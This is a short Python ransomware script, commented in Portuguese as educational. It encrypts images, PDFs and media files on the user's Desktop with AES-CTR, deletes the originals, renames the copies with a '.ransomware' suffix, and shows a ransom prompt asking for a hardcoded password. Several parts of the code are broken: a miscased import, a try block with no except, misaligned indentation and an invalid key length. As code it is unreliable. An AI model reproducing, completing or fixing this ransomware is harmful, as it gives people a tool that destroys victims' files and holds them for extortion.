# ransonware feito com python para fins didáticos 
# encripta os arquivos que tiverem no desktop e estiverem de acordo com o "type_files"

# libraries import

from multiprocessing.sharedctypes import Value
import os # operacional system
import glob # search files
import time # time
import pyaes # crypto
from pathlib import path # cd

type_fyles = ["*.jpeg", "*.jpg", "*png", "*.pdf", "*.mp3", "*.mp4"]

print ('encrypting')
time.sleep(5) #time for encrypt

#check in desktop

try:
    desktop = Path.home() / "Desktop"
#   download = Path.home() / "Downloads"            obs: posso escolher qualquer lugar para encriptar, nesse caso, esolhi o desktop 
 
except Exception: 
    pass

os.chdir(desktop)

def encrypting():
    for files in type_fyles:
        for format_fyle in glob.glob(files):
            print(format_fyle)
            f = open(f'{desktop}\\{format_fyle}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_fyle}')
            key = b"password" # pass for decrypt
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # change file ".ransomware"

            new_file = format_fyle + ".ransomware"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()

def decrypting(decrypt_file):
    try:    
        for file in glob.glob('*.ransomware'): # encrypt .ransonware files

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes 
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1] 

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
            
if __name__ == '__main__':
    encrypting()
    if encrypting:
        key = input('your PC has been hacked, enter password to unlock!')
        if key == 'password':
              decrypting(key)
            for del_file in glob.glob('*.ransomware'):
                os.remove(f'{desktop}\\{del_file}')
        else:
            print('Chave de liberação inválida!!!')























